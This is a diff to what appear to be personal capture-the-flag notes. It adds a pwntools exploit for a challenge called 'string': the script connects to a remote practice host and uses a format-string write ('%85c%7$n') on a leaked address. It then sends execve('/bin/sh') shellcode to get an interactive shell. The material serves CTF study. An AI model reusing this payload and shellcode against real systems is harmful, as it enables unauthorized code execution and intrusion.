@@ -120,7 +120,44 @@ for i in range(10):
 
 p.interactive()
 ```
-# sztrunbg
+# string
+```python
+from pwn import *
+#p=process('./string')
+p=remote('111.198.29.45',51436)
+
+p.recvuntil('secret[0] is ')
+v4_addr=p.recvuntil('\n')
+v4_addr=int(v4_addr[:-1],16)
+
+pay='%85c%7$n'
+
+p.recvuntil('be:')
+p.sendline('ffdy')
+
+p.recvuntil('up?:')
+p.sendline('east')
+
+p.recvuntil('(0)?:')
+p.sendline('1')
+
+p.recvuntil("address'")
+p.sendline(str(v4_addr))
+
+p.recvuntil("is:")
+p.sendline(pay)
+
+
+shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" 
+
+p.recvuntil("USE YOU SPELL")
+p.sendline(shellcode)
+p.interactive()
+
+#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+```
+
+# int_overflow
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTM4NzQ1Nzk5Niw2MDU0NjcxMV19
+eyJoaXN0b3J5IjpbMTQzMTc1NjM5NCw2MDU0NjcxMV19
 -->
